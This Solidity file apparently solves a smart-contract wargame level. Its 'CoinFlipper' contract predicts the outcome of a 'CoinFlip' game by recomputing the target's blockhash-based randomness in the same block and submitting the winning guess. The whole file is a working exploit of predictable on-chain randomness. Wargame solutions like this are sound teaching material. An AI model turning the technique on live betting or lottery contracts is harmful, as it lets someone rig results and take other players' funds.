// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipper {
    uint256 number;
    CoinFlip coinFlip;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) {
        coinFlip = CoinFlip(_coinFlipAddress);
    }

    function flipper() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlipped = blockValue / FACTOR;
        bool sidePicked = coinFlipped == 1 ? true : false;
        coinFlip.flip(sidePicked);
    }
}
